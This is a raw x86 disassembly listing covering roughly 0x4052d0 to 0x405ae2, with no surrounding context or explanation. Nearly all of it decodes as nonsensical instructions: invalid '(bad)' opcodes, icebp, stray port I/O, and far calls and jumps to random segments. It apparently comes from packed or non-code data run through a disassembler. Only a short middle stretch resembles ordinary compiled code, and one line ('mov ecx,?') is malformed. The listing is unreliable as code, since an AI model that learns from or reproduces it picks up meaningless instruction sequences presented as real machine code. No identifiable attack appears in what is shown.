  4052d0:	sbb    ebp,DWORD PTR [ebp-0x16b1b7cb]
  4052d6:	cli    
  4052d7:	(bad)  
  4052d8:	jne    0x40527a
  4052da:	icebp  
  4052db:	xchg   esi,eax
  4052dc:	sub    bl,ch
  4052de:	adc    eax,0x4e966476
  4052e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052e4:	push   edi
  4052e5:	in     eax,0xc1
  4052e7:	jae    0x4052c9
  4052e9:	push   esp
  4052ea:	adc    esp,DWORD PTR [esi+0x52]
  4052ed:	pop    edi
  4052ee:	sub    eax,ecx
  4052f0:	sahf   
  4052f1:	imul   esi,DWORD PTR [edx+0x7d],0x8
  4052f5:	and    ebp,DWORD PTR [ebx+0x7e2e5d4e]
  4052fb:	inc    esp
  4052fc:	mov    eax,ds:0x6ac60d9d
  405301:	ins    BYTE PTR es:[edi],dx
  405302:	adc    eax,edx
  405304:	push   edx
  405305:	(bad)  [ebx-0x6a]
  405308:	lds    esi,FWORD PTR ds:0x1ef3dc8d
  40530e:	arpl   WORD PTR [edx-0x66],si
  405311:	ja     0x405299
  405313:	out    dx,al
  405314:	mov    dh,0x4
  405316:	xchg   ebx,eax
  405317:	jo     0x4052e4
  405319:	mov    ebp,0xd90e9c21
  40531e:	mov    esp,0x43518965
  405323:	pop    esi
  405324:	sub    BYTE PTR [esi-0x2cedb41],0x28
  40532b:	mov    eax,0x8b8ef139
  405330:	mov    edx,DWORD PTR [ebp-0x7ad6b42d]
  405336:	call   FWORD PTR [ebp+0x423d50b]
  40533c:	test   al,0xc6
  40533e:	imul   esi,DWORD PTR ds:0x27070829,0xec4fe769
  405348:	call   0xcb3b:0x3da916fa
  40534f:	(bad)  
  405350:	test   BYTE PTR [edx+eiz*4+0x57468421],ch
  405357:	imul   eax,DWORD PTR [esi+ebp*4-0x37],0x11f07ff1
  40535f:	xchg   edx,eax
  405360:	mov    ecx,edx
  405362:	push   ebx
  405363:	mov    ebx,0xff4ce945
  405368:	repz sbb ebp,DWORD PTR [eax]
  40536b:	(bad)  
  40536c:	mov    eax,ds:0x943922dd
  405371:	dec    edi
  405372:	adc    al,0x56
  405374:	fs xchg ebp,eax
  405376:	pushf  
  405377:	out    0x49,al
  405379:	dec    ebx
  40537a:	jae    0x40532b
  40537c:	push   eax
  40537d:	hlt    
  40537e:	sub    edx,DWORD PTR [esi+0x18bd4a9c]
  405384:	inc    ebp
  405385:	int    0xe5
  405387:	jbe    0x405382
  405389:	add    eax,0x76ee7b3f
  40538e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40538f:	adc    eax,0x57e4803a
  405394:	call   0xbf72:0xacc1a39a
  40539b:	inc    eax
  40539c:	or     al,bl
  40539e:	sub    eax,0x2296d587
  4053a3:	pop    edx
  4053a4:	jo     0x40534b
  4053a6:	lea    esp,ds:0x3cac44e1
  4053ac:	loop   0x405409
  4053ae:	cld    
  4053af:	frstor [edx-0x5]
  4053b2:	jmp    0xa597:0xe0c71890
  4053b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053ba:	xchg   ecx,eax
  4053bb:	jl     0x405391
  4053bd:	cmp    ecx,DWORD PTR [edx-0x1db94faf]
  4053c3:	pop    esi
  4053c4:	xchg   esp,eax
  4053c5:	push   cs
  4053c6:	das    
  4053c7:	push   ss
  4053c8:	sbb    BYTE PTR [edx-0x7639b685],ah
  4053ce:	inc    esi
  4053cf:	call   0x58db:0x3e961217
  4053d6:	sub    al,0xc0
  4053d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053d9:	and    ah,BYTE PTR [ebx+esi*8+0x61]
  4053dd:	mov    al,BYTE PTR [ecx]
  4053df:	ret    0x9be9
  4053e2:	jnp    0x40542f
  4053e4:	nop
  4053e5:	jp     0x4053ce
  4053e7:	or     cl,ah
  4053e9:	pop    DWORD PTR [esi-0x3c]
  4053ec:	xchg   ecx,eax
  4053ed:	mov    ds:0x364c1e8f,al
  4053f2:	pushf  
  4053f3:	xlat   BYTE PTR ds:[ebx]
  4053f4:	mov    ebx,DWORD PTR [edx]
  4053f6:	jmp    0xeb93:0x7dfbfb11
  4053fd:	ds xchg esp,eax
  4053ff:	sub    edi,ebp
  405401:	lock int3 
  405403:	sub    BYTE PTR [esp+esi*4-0x48],dh
  405407:	or     edi,DWORD PTR [esi+0x28]
  40540a:	or     esp,eax
  40540c:	dec    eax
  40540d:	lods   eax,DWORD PTR ds:[esi]
  40540e:	sti    
  40540f:	mov    dl,0xf6
  405411:	aaa    
  405412:	and    DWORD PTR [edx+0x2],ebx
  405415:	inc    ebp
  405416:	setne  BYTE PTR [eax]
  405419:	pop    es
  40541a:	cdq    
  40541b:	xchg   esi,eax
  40541c:	pop    ds
  40541d:	pusha  
  40541e:	dec    edx
  40541f:	mov    ecx,0xf3818d21
  405424:	sar    BYTE PTR [ecx],cl
  405426:	xchg   BYTE PTR [ebp+0x18],dh
  405429:	push   ebp
  40542a:	mov    esp,0x30963906
  40542f:	xor    eax,0x1024ae5d
  405434:	mov    ah,0x3f
  405436:	pop    esi
  405437:	in     al,dx
  405438:	clc    
  405439:	rcr    DWORD PTR [edx],0xa3
  40543c:	in     eax,dx
  40543d:	pop    esp
  40543e:	jb     0x405437
  405440:	inc    ebp
  405441:	push   ss
  405442:	xchg   edx,eax
  405443:	call   FWORD PTR [eax]
  405445:	add    edx,DWORD PTR [ecx]
  405447:	call   0xdaa73ba3
  40544c:	ret    0xda0c
  40544f:	push   edx
  405450:	add    eax,DWORD PTR [eax+0x1315f366]
  405456:	into   
  405457:	sahf   
  405458:	push   cs
  405459:	pop    ecx
  40545a:	es and al,0xe8
  40545d:	jecxz  0x405493
  40545f:	or     esi,DWORD PTR [esi+0xb8937fd]
  405465:	in     al,dx
  405466:	bound  ebp,QWORD PTR [ecx-0x48a85129]
  40546c:	inc    esp
  40546d:	pop    ebx
  40546e:	and    BYTE PTR [eax+0x1a],0x7e
  405472:	aas    
  405473:	int    0xba
  405475:	add    DWORD PTR [edx+edi*2+0x3fcdff48],ecx
  40547c:	pusha  
  40547d:	test   BYTE PTR [esi-0x767ade40],cl
  405483:	or     DWORD PTR [eax-0x6bb2579c],eax
  405489:	je     0x4054a8
  40548b:	pop    ebp
  40548c:	cwde   
  40548d:	add    BYTE PTR [ecx+0x7e],ah
  405490:	fs repnz hlt 
  405493:	or     ah,BYTE PTR [ecx+0x3ba6fae6]
  405499:	leave  
  40549a:	xchg   esi,eax
  40549b:	fs leave 
  40549d:	xor    esi,0x60
  4054a0:	mov    eax,ds:0x500eb47
  4054a5:	dec    ecx
  4054a6:	mov    ch,0xb3
  4054a8:	enter  0x7b48,0xab
  4054ac:	mov    eax,DWORD PTR [ebp+0x72]
  4054af:	push   cs
  4054b0:	popa   
  4054b1:	bound  ecx,QWORD PTR [ebx+0x7d]
  4054b4:	inc    ebp
  4054b5:	leave  
  4054b6:	jge    0x405473
  4054b8:	adc    esi,DWORD PTR [ecx+0x3621661e]
  4054be:	mov    al,ds:0x9b6fb835
  4054c3:	dec    ecx
  4054c4:	pop    ss
  4054c5:	retf   0x192e
  4054c8:	rcl    DWORD PTR [ecx+eiz*1+0x67],1
  4054cc:	sbb    eax,0x45bd1acb
  4054d1:	mov    ebp,0x91a74184
  4054d6:	xchg   bh,dl
  4054d8:	stos   BYTE PTR es:[edi],al
  4054d9:	mov    edi,0x56b39aae
  4054de:	ins    DWORD PTR es:[edi],dx
  4054df:	stc    
  4054e0:	mov    edx,0xa0c3cc24
  4054e5:	add    ch,BYTE PTR [ebx]
  4054e7:	into   
  4054e8:	cmc    
  4054e9:	and    DWORD PTR [ebx-0x27],ebp
  4054ec:	mov    ds:0x1216afea,eax
  4054f1:	push   ds
  4054f2:	scas   al,BYTE PTR es:[edi]
  4054f3:	shl    DWORD PTR cs:[ecx],cl
  4054f6:	xor    edx,DWORD PTR [eax+0x4670cf8c]
  4054fc:	in     al,dx
  4054fd:	inc    ebp
  4054fe:	les    edx,FWORD PTR [eax-0x7cfa645]
  405504:	adc    esi,DWORD PTR [edx]
  405506:	or     BYTE PTR [esi-0x720a3f3d],bl
  40550c:	fiadd  WORD PTR [edx+0x17]
  40550f:	aad    0x1d
  405511:	push   cs
  405512:	shl    BYTE PTR [ebp+0x1cf824e7],0x7d
  405519:	and    BYTE PTR [ecx],ch
  40551b:	test   BYTE PTR [ecx+0x2a],dl
  40551e:	mov    esp,0xa49a6b5
  405523:	fidiv  WORD PTR [ebp+0x4e115672]
  405529:	(bad)  
  40552a:	xchg   DWORD PTR [eax+0x6dded96e],edx
  405530:	iret   
  405531:	mov    ds:0xaf5b6e36,al
  405536:	xor    BYTE PTR [ecx],dh
  405538:	jo     0x40555f
  40553a:	mov    al,ds:0x96ed6407
  40553f:	mov    bh,BYTE PTR [ecx-0x25]
  405542:	push   ds
  405543:	mov    DWORD PTR [ebp-0x3d],ecx
  405546:	mov    esi,0x843f84d7
  40554b:	pop    ds
  40554c:	xchg   edx,eax
  40554d:	pop    ecx
  40554e:	(bad)  
  40554f:	mov    al,ds:0x33a945c8
  405554:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405555:	push   es
  405556:	mov    eax,ds:0x3ae0e483
  40555b:	xchg   esp,eax
  40555c:	mov    ecx,0x24540ffc
  405561:	std    
  405562:	rcr    BYTE PTR [ebx-0x4dbe3c40],cl
  405568:	es pop ds
  40556a:	xchg   esp,eax
  40556b:	dec    ebx
  40556c:	adc    al,BYTE PTR [ecx+0x1]
  40556f:	or     BYTE PTR [edi-0x69],bh
  405572:	cmp    eax,0x5ec7c50a
  405577:	or     DWORD PTR [ecx+ecx*2+0x45daeceb],esi
  40557e:	lods   al,BYTE PTR ds:[esi]
  40557f:	adc    eax,0x37aa2f91
  405584:	aaa    
  405585:	push   edx
  405586:	jno    0x405598
  405588:	xlat   BYTE PTR ds:[ebx]
  405589:	and    al,0x14
  40558b:	add    eax,0x106e1f2b
  405590:	adc    BYTE PTR [edi-0x5518f617],bl
  405596:	stos   DWORD PTR es:[edi],eax
  405597:	xchg   edi,eax
  405598:	and    al,0xec
  40559a:	mov    bl,0x92
  40559c:	aam    0x7d
  40559e:	fldenv [esi-0x7c]
  4055a1:	pmulhw mm3,QWORD PTR [edi-0xf]
  4055a5:	and    al,0x2d
  4055a7:	stos   BYTE PTR es:[edi],al
  4055a8:	mov    ds,WORD PTR [ebx]
  4055aa:	sub    DWORD PTR [ecx-0x3da162d9],esi
  4055b0:	jno    0x405548
  4055b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055b3:	cli    
  4055b4:	xchg   edx,eax
  4055b5:	inc    esi
  4055b6:	add    ebp,DWORD PTR [ecx]
  4055b8:	mov    cl,0x2a
  4055ba:	push   0xffffffb6
  4055bc:	xchg   edi,eax
  4055bd:	adc    esp,DWORD PTR ds:0xf72c4f21
  4055c3:	jns    0x4055de
  4055c5:	repnz das 
  4055c7:	ins    DWORD PTR es:[edi],dx
  4055c8:	pop    esp
  4055c9:	popf   
  4055ca:	jno    0x4055fb
  4055cc:	cs and al,0x48
  4055cf:	pop    esi
  4055d0:	jg     0x405568
  4055d2:	adc    bl,bl
  4055d4:	pushf  
  4055d5:	retfw  
  4055d7:	stc    
  4055d8:	in     eax,dx
  4055d9:	scas   eax,DWORD PTR es:[edi]
  4055da:	jg     0x4055b1
  4055dc:	jae    0x40557e
  4055de:	add    al,0x11
  4055e0:	iret   
  4055e1:	imul   esp,DWORD PTR [ebx-0x286cf481],0x38
  4055e8:	push   0x73
  4055ea:	and    ecx,DWORD PTR [edi+0x4e42cb60]
  4055f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055f1:	xchg   ecx,eax
  4055f2:	mov    esp,edx
  4055f4:	mov    dh,0xd4
  4055f6:	sti    
  4055f7:	sbb    ebp,DWORD PTR [esi+ebx*2]
  4055fa:	cli    
  4055fb:	or     ebp,DWORD PTR [ebx+0x2a]
  4055fe:	addr16 cmp al,0x3e
  405601:	push   ecx
  405602:	adc    esi,DWORD PTR [edi+edi*8]
  405605:	push   eax
  405606:	jecxz  0x40565f
  405608:	sbb    BYTE PTR [eax],cl
  40560a:	push   ss
  40560b:	out    0x1e,eax
  40560d:	in     eax,dx
  40560e:	push   edi
  40560f:	ja     0x4055b5
  405611:	(bad)  
  405612:	sbb    edi,DWORD PTR ss:[edx-0x21eeeeba]
  405619:	aas    
  40561a:	(bad)  
  40561b:	dec    ecx
  40561c:	xchg   edi,ecx
  40561e:	cwde   
  40561f:	xor    ebp,ebx
  405621:	dec    ebx
  405622:	adc    edi,DWORD PTR [eax+eax*1-0x75dd972]
  405629:	pop    edx
  40562a:	loope  0x4056a1
  40562c:	pop    eax
  40562d:	ja     0x405689
  40562f:	mov    al,0x43
  405631:	icebp  
  405632:	mov    ah,0xf6
  405634:	and    DWORD PTR [ebx],ebp
  405636:	push   edi
  405637:	and    eax,0x3dc58ce4
  40563c:	jp     0x4055d6
  40563e:	or     BYTE PTR [esi],dh
  405640:	pop    ebp
  405641:	dec    esp
  405642:	xchg   ecx,eax
  405643:	stos   DWORD PTR es:[edi],eax
  405644:	sbb    DWORD PTR [ebx+0x50],edi
  405647:	xchg   esi,eax
  405648:	dec    esp
  405649:	xchg   edi,eax
  40564a:	aad    0x7d
  40564c:	int    0x16
  40564e:	mov    eax,ds:0xff0bef4a
  405653:	mov    ds:0x45d644af,eax
  405658:	cmc    
  405659:	xchg   esp,eax
  40565a:	push   esp
  40565b:	sbb    bl,BYTE PTR ds:0x9d64ce2d
  405661:	and    al,0xae
  405663:	pop    esi
  405664:	cmc    
  405665:	call   0xedfb:0xd737aeb4
  40566c:	inc    ebx
  40566d:	rcr    DWORD PTR [esp+edi*2-0x7b],cl
  405671:	data16 lods al,BYTE PTR ds:[esi]
  405673:	retf   0x430a
  405676:	sub    DWORD PTR [eax+0x6f],ecx
  405679:	jnp    0x4055ff
  40567b:	or     esp,0x9
  40567e:	enter  0x5867,0x8a
  405682:	jg     0x4056f3
  405684:	pop    ss
  405685:	xchg   ebp,eax
  405686:	inc    edx
  405687:	mov    al,ds:0x59ae1e50
  40568c:	js     0x405680
  40568e:	xlat   BYTE PTR es:[ebx]
  405690:	mov    ds:0x90bbf76f,al
  405695:	daa    
  405696:	sbb    BYTE PTR ds:0xe5a12ecb,dl
  40569c:	add    DWORD PTR [ebx+edx*2+0x44a13a8],ebp
  4056a3:	scas   eax,DWORD PTR es:[edi]
  4056a4:	stos   DWORD PTR es:[edi],eax
  4056a5:	xchg   esi,eax
  4056a6:	or     bh,ah
  4056a8:	push   edx
  4056a9:	ret    0x5494
  4056ac:	fucomi st,st(5)
  4056ae:	(bad)  
  4056af:	das    
  4056b0:	mov    DWORD PTR [edx+0x22],edi
  4056b3:	cmc    
  4056b4:	mov    ds,WORD PTR [ecx+ebp*4+0x7e]
  4056b8:	leave  
  4056b9:	mov    DWORD PTR [ebx],esi
  4056bb:	int3   
  4056bc:	xor    ah,BYTE PTR [edx-0x2b]
  4056bf:	faddp  st(4),st
  4056c1:	mov    bh,0xee
  4056c3:	inc    edx
  4056c4:	out    dx,al
  4056c5:	push   edi
  4056c6:	dec    edi
  4056c7:	and    eax,esp
  4056c9:	add    bl,cl
  4056cb:	jb     0x405734
  4056cd:	ss dec edi
  4056cf:	xchg   ebp,ebx
  4056d1:	data16 lods al,BYTE PTR ds:[esi]
  4056d3:	mov    ds:0x11e449c6,eax
  4056d8:	push   0x7cf92238
  4056dd:	push   esp
  4056de:	mov    cl,0xcd
  4056e0:	mov    al,0xf5
  4056e2:	fadd   st,st(3)
  4056e4:	outs   dx,BYTE PTR ds:[esi]
  4056e5:	into   
  4056e6:	retf   0x865e
  4056e9:	dec    eax
  4056ea:	rcl    DWORD PTR [edx],0x65
  4056ed:	outs   dx,DWORD PTR ds:[esi]
  4056ee:	sbb    BYTE PTR [ebp+0x1e],0x24
  4056f2:	and    ebx,DWORD PTR ds:0x6ae9ebb5
  4056f8:	dec    eax
  4056f9:	adc    BYTE PTR [ebp-0x55e9dfda],cl
  4056ff:	lea    ebp,[ecx+ecx*4-0x1d]
  405703:	test   DWORD PTR [esi+0x3a195365],esi
  405709:	push   edx
  40570a:	or     bl,ah
  40570c:	(bad)
  405710:	lea    ecx,[edx+eax*1]
  405713:	mov    eax,DWORD PTR [ebx]
  405715:	movzx  edx,WORD PTR ds:0x4228ca
  40571c:	or     edx,DWORD PTR ds:0x4229ae
  405722:	mov    DWORD PTR ds:0x4228ca,edx
  405728:	mov    edx,DWORD PTR [ebx+0x4]
  40572b:	sub    DWORD PTR ds:0x4228de,0x42296a
  405735:	shrd   eax,edx,0x2
  405739:	shr    edx,0x2
  40573c:	cmp    DWORD PTR ds:0x422936,0x0
  405743:	mov    DWORD PTR ds:0x42296a,edx
  405749:	mov    DWORD PTR ds:0x4229ca,0x5a5b
  405753:	mov    DWORD PTR ds:0x422952,0x59ac
  40575d:	jmp    0x4057b9
  405762:	not    edx
  405764:	mov    edx,DWORD PTR ds:0x4228aa
  40576a:	jbe    0x4057a1
  405770:	push   0x1
  405772:	push   0x68d9
  405777:	call   DWORD PTR ds:0x42a29c
  40577d:	mov    edx,DWORD PTR ds:0x4229ce
  405783:	add    DWORD PTR ds:0x422922,edx
  405789:	xor    edx,edx
  40578b:	or     edx,DWORD PTR ds:0x422926
  405791:	add    DWORD PTR ds:0x42297a,edx
  405797:	or     DWORD PTR ds:0x4228d6,0x1005
  4057a1:	add    DWORD PTR ds:0x4228ae,ecx
  4057a7:	mov    DWORD PTR ds:0x422912,0x7731
  4057b1:	add    edx,0x5dfe
  4057b7:	not    edx
  4057b9:	mov    DWORD PTR [ebp-0x1c],eax
  4057bc:	mov    edx,DWORD PTR ds:0x422982
  4057c2:	or     DWORD PTR ds:0x4228c2,edx
  4057c8:	mov    eax,DWORD PTR [ebx]
  4057ca:	jmp    0x405d54
  4057cf:	loope  0x405800
  4057d1:	adc    eax,0x58a019aa
  4057d6:	adc    al,0x1b
  4057d8:	push   ds
  4057d9:	fsubr  DWORD PTR [eax+0x72a277b8]
  4057df:	adc    DWORD PTR [ecx+0x43d1616],esp
  4057e5:	push   ss
  4057e6:	push   ss
  4057e7:	retf   
  4057e8:	pop    esi
  4057e9:	cdq    
  4057ea:	fdiv   QWORD PTR [edi-0x5b]
  4057ed:	and    DWORD PTR [edx],0x3b
  4057f0:	into   
  4057f1:	inc    esi
  4057f2:	inc    ecx
  4057f3:	push   esi
  4057f4:	cmp    esp,DWORD PTR [ecx]
  4057f6:	cmp    esp,ebx
  4057f8:	inc    edi
  4057f9:	hlt    
  4057fa:	call   0xd3641747
  4057ff:	mov    eax,0xbf1ac3ee
  405804:	push   ecx
  405805:	xor    eax,0xadaaa4b1
  40580a:	clc    
  40580b:	popa   
  40580c:	icebp  
  40580d:	pop    ecx
  40580e:	pop    edi
  40580f:	dec    ebp
  405810:	fwait
  405811:	push   esi
  405812:	mov    bh,0xf8
  405814:	not    bl
  405816:	jmp    0xa55014e0
  40581b:	xor    ebp,DWORD PTR [edi+eax*8+0x14b0a70f]
  405822:	shl    BYTE PTR [edx],cl
  405824:	ins    BYTE PTR es:[edi],dx
  405825:	push   eax
  405826:	jbe    0x405882
  405828:	sbb    al,0xd2
  40582a:	loop   0x4058a7
  40582c:	aad    0xed
  40582e:	sub    cl,BYTE PTR gs:[ebx+0xfe120ae]
  405835:	fwait
  405836:	inc    edx
  405837:	rol    DWORD PTR [esi+eax*2+0x5d9ae5bd],1
  40583e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40583f:	pop    esi
  405840:	sbb    ecx,DWORD PTR [edx+0x13c89bf4]
  405846:	in     al,0x46
  405848:	lds    eax,FWORD PTR [edx+eax*2+0x7d]
  40584c:	xchg   edi,eax
  40584d:	pop    edi
  40584e:	and    BYTE PTR [ebp+0x59bcf134],ah
  405854:	pop    ecx
  405855:	pop    ebp
  405856:	inc    edi
  405857:	das    
  405858:	shl    DWORD PTR ds:0x2d0ee507,1
  40585e:	pop    edi
  40585f:	pusha  
  405860:	cmc    
  405861:	mov    ch,0x2c
  405863:	mov    ebx,0x5ca16fc1
  405868:	stos   BYTE PTR es:[edi],al
  405869:	out    dx,eax
  40586a:	int3   
  40586b:	mov    ds:0x96099577,eax
  405870:	test   eax,0x42bd5abc
  405875:	sbb    al,0x2d
  405877:	jmp    0x5d0f785c
  40587c:	and    al,0xe5
  40587e:	push   ebp
  40587f:	stos   BYTE PTR es:[edi],al
  405880:	push   es
  405881:	clc    
  405882:	sub    eax,ecx
  405884:	out    0xef,eax
  405886:	mov    ecx,?
  405888:	mov    es,edi
  40588a:	lock or DWORD PTR [eax],edi
  40588d:	mov    ds:0x7d32d638,al
  405892:	adc    ebx,eax
  405894:	rcl    DWORD PTR [ebx+ecx*1],1
  405897:	test   al,0x4c
  405899:	ins    BYTE PTR es:[edi],dx
  40589a:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40589c:	out    dx,al
  40589d:	fnstenv [ecx+0x131f1d5b]
  4058a3:	mov    esi,0x9abf7e67
  4058a8:	test   al,0x4d
  4058aa:	mov    bh,0xbf
  4058ac:	fwait
  4058ad:	out    dx,eax
  4058ae:	neg    eax
  4058b0:	lods   eax,DWORD PTR ds:[esi]
  4058b1:	sub    DWORD PTR [ecx+0x6069ed21],0x2e
  4058b8:	sub    eax,0x84f41d81
  4058bd:	(bad)  [ecx+ebp*2+0x437a0ca5]
  4058c4:	pusha  
  4058c5:	inc    esi
  4058c6:	push   esi
  4058c7:	xor    BYTE PTR ds:0xf942a5c0,0xac
  4058ce:	hlt    
  4058cf:	xchg   ebp,eax
  4058d0:	out    0xc0,al
  4058d2:	pop    esp
  4058d3:	in     al,0xb
  4058d5:	mov    ch,0x62
  4058d7:	xlat   BYTE PTR ds:[ebx]
  4058d8:	(bad)  
  4058d9:	mov    eax,ds:0x29cb8c96
  4058de:	push   edx
  4058df:	or     al,BYTE PTR [ebx-0xb51dcd1]
  4058e5:	ret    
  4058e6:	jno    0x4058fb
  4058e8:	sub    ch,cl
  4058ea:	not    BYTE PTR [ebx-0x4e]
  4058ed:	inc    edi
  4058ee:	dec    ebp
  4058ef:	popa   
  4058f0:	jl     0x40588c
  4058f2:	stos   BYTE PTR es:[edi],al
  4058f3:	add    al,0xdb
  4058f5:	aas    
  4058f6:	push   ds
  4058f7:	imul   ebx,DWORD PTR [edi-0x53fe9959],0x23
  4058fe:	loop   0x40590b
  405900:	lods   al,BYTE PTR ds:[esi]
  405901:	xor    BYTE PTR [esp+eax*1+0x567bd8c7],cl
  405908:	lea    esi,[eax+ecx*2+0x23]
  40590c:	sub    ah,al
  40590e:	(bad)  
  40590f:	retf   
  405910:	push   ds
  405911:	dec    edi
  405912:	fisubr WORD PTR [edx+0x6f30cc8]
  405918:	mov    edi,0xaafb737
  40591d:	push   esi
  40591e:	sbb    bl,BYTE PTR [ebx]
  405920:	es ret 
  405922:	xchg   ecx,eax
  405923:	mov    eax,0xa6f7a21c
  405928:	(bad)  
  405929:	adc    bl,BYTE PTR [esi]
  40592b:	cwde   
  40592c:	ins    DWORD PTR es:[edi],dx
  40592d:	add    bh,cl
  40592f:	inc    edi
  405930:	cmp    esp,ebx
  405932:	push   esp
  405933:	ret    
  405934:	fidivr WORD PTR [ecx-0x1f]
  405937:	adc    DWORD PTR [edx+0x2d54b88c],0xee05778b
  405941:	or     bh,ah
  405943:	neg    ebp
  405945:	in     eax,dx
  405946:	sti    
  405947:	inc    edi
  405948:	sbb    DWORD PTR [edi+0x7e],0xcdc1c497
  40594f:	push   ecx
  405950:	cmp    al,0xce
  405952:	pop    ecx
  405953:	call   0x9e92:0x6d32830e
  40595a:	rol    DWORD PTR [edi-0x6d],1
  40595d:	dec    ebx
  40595e:	(bad)  
  40595f:	adc    eax,DWORD PTR [edx-0x6c]
  405962:	or     dl,BYTE PTR [eax+0x7]
  405965:	fcmovu st,st(2)
  405967:	pop    esp
  405968:	sbb    ax,0x4ac6
  40596c:	shl    BYTE PTR [ebp-0x254b41d6],cl
  405972:	jb     0x4059e1
  405974:	pop    esi
  405975:	push   ebp
  405976:	in     al,dx
  405977:	mov    edi,0xf08e717e
  40597c:	sbb    BYTE PTR [eax+0xe00fdbf],0x7b
  405983:	xor    al,0xe9
  405985:	and    eax,0xd443962b
  40598a:	jo     0x40597b
  40598c:	das    
  40598d:	bnd jbe 0x405981
  405990:	mov    bl,0x5f
  405992:	jo     0x4059c0
  405994:	(bad)  
  405995:	jmp    0x4059a0
  405997:	and    al,0x7
  405999:	inc    edx
  40599a:	(bad)  
  40599b:	shl    BYTE PTR [eax],cl
  40599d:	in     al,dx
  40599e:	gs or  eax,0xebb64d94
  4059a4:	test   DWORD PTR [esi+0x29f155bf],ebx
  4059aa:	adc    bl,bl
  4059ac:	ss mov ecx,0xef55fcd
  4059b2:	xor    BYTE PTR [ebx],ah
  4059b4:	ficom  DWORD PTR [ebp+0xb]
  4059b7:	mov    dl,0x81
  4059b9:	mov    bh,0xa
  4059bb:	mov    eax,0x6c4543b5
  4059c0:	push   eax
  4059c1:	jl     0x405969
  4059c3:	sbb    BYTE PTR [ecx-0x7c689426],dh
  4059c9:	arpl   WORD PTR [ebp+0x76],sp
  4059cc:	jae    0x4059a3
  4059ce:	adc    BYTE PTR [edi+0x78],dl
  4059d1:	adc    ah,BYTE PTR [edi+ebp*4]
  4059d4:	inc    esi
  4059d5:	(bad)  
  4059d6:	pop    ss
  4059d7:	jne    0x40597f
  4059d9:	pop    edi
  4059da:	xlat   BYTE PTR ds:[ebx]
  4059db:	arpl   WORD PTR [eax-0x47e740b],sp
  4059e1:	dec    esi
  4059e2:	push   eax
  4059e3:	add    DWORD PTR [ecx-0x177b73b4],0xffffffe5
  4059ea:	fwait
  4059eb:	mov    dl,0xe1
  4059ed:	into   
  4059ee:	cli    
  4059ef:	in     eax,dx
  4059f0:	ins    DWORD PTR es:[edi],dx
  4059f1:	or     ecx,DWORD PTR [ebx+0x58]
  4059f4:	dec    ebp
  4059f5:	and    edi,DWORD PTR [ecx]
  4059f7:	pop    esi
  4059f8:	ss (bad) 
  4059fa:	nop
  4059fb:	aaa    
  4059fc:	push   ss
  4059fd:	std    
  4059fe:	mov    cl,0x5f
  405a00:	inc    edx
  405a01:	push   ds
  405a02:	fdiv   DWORD PTR fs:[eax+0x7]
  405a06:	xor    eax,0xccb5dbc7
  405a0b:	inc    esi
  405a0c:	shr    esp,cl
  405a0e:	icebp  
  405a0f:	lock mov esi,0x14bdf9c4
  405a15:	jns    0x405a78
  405a17:	repnz (bad) 
  405a19:	push   cs
  405a1a:	xchg   esp,eax
  405a1b:	arpl   WORD PTR [edi+0x2f],bx
  405a1e:	mov    cl,BYTE PTR [ebx]
  405a20:	sbb    esi,DWORD PTR [ecx+0x1d061dc9]
  405a26:	retf   0xe5da
  405a29:	shl    DWORD PTR [edi],1
  405a2b:	mov    al,gs:0xc2e6135d
  405a31:	mov    edx,DWORD PTR [edx]
  405a33:	jecxz  0x4059d4
  405a35:	dec    esp
  405a36:	inc    eax
  405a37:	jl     0x405a26
  405a39:	pop    ds
  405a3a:	jmp    0xe070a694
  405a3f:	(bad)  
  405a40:	pop    ebx
  405a41:	mov    al,ds:0x5dad8276
  405a46:	fadd   QWORD PTR ds:0xddb4287b
  405a4c:	push   ebp
  405a4d:	mov    edi,0x2c353fb2
  405a52:	(bad)  
  405a53:	adc    esi,DWORD PTR [edi-0x6d1c0afb]
  405a59:	mov    ch,0xf2
  405a5b:	fs inc eax
  405a5d:	and    ah,bl
  405a5f:	mov    ah,0xf9
  405a61:	sti    
  405a62:	sbb    bh,cl
  405a64:	add    ebp,DWORD PTR [ebp-0x1cd31dc9]
  405a6a:	clc    
  405a6b:	rcr    DWORD PTR [edx],0x5f
  405a6e:	sti    
  405a6f:	pop    ds
  405a70:	in     al,dx
  405a71:	push   ebp
  405a72:	dec    esp
  405a73:	cwde   
  405a74:	jmp    0x6996:0x21f9ba1d
  405a7b:	arpl   WORD PTR [ebx-0x145902b6],bp
  405a81:	sbb    eax,0x325ce32a
  405a86:	push   es
  405a87:	inc    ebx
  405a88:	cwde   
  405a89:	jp     0x405aed
  405a8b:	pushf  
  405a8c:	stos   DWORD PTR es:[edi],eax
  405a8d:	mov    WORD PTR [ebp+0x1],fs
  405a90:	inc    edx
  405a91:	test   DWORD PTR ds:0xe6508951,ebx
  405a97:	push   esi
  405a98:	out    0xfe,eax
  405a9a:	cmp    DWORD PTR ds:0x6d337ca5,ebx
  405aa0:	cmp    al,0x17
  405aa2:	inc    esi
  405aa3:	ret    0x85a6
  405aa6:	mov    BYTE PTR [ecx+0x49],dl
  405aa9:	or     BYTE PTR [ebx-0x24],al
  405aac:	lods   al,BYTE PTR ds:[esi]
  405aad:	pop    esi
  405aae:	pusha  
  405aaf:	jb     0x405a45
  405ab1:	les    edi,FWORD PTR [ecx+0x2060ecc9]
  405ab7:	jle    0x405b11
  405ab9:	ins    DWORD PTR es:[edi],dx
  405aba:	sahf   
  405abb:	stos   BYTE PTR es:[edi],al
  405abc:	dec    ebp
  405abd:	lods   eax,DWORD PTR ds:[esi]
  405abe:	and    esi,ecx
  405ac0:	xchg   ebx,eax
  405ac1:	mov    ebp,0x3a07d6e0
  405ac6:	xchg   DWORD PTR [edx+0x7bff9a55],esp
  405acc:	test   eax,0xebcc296c
  405ad1:	xchg   ebp,eax
  405ad2:	mov    ds:0x55b3a0b6,al
  405ad7:	sahf   
  405ad8:	xor    al,0x13
  405ada:	add    dl,BYTE PTR [ecx+0x44]
  405add:	ret    0xf1e9
  405ae0:	loop   0x405ab4
  405ae2:	out    0x67,eax
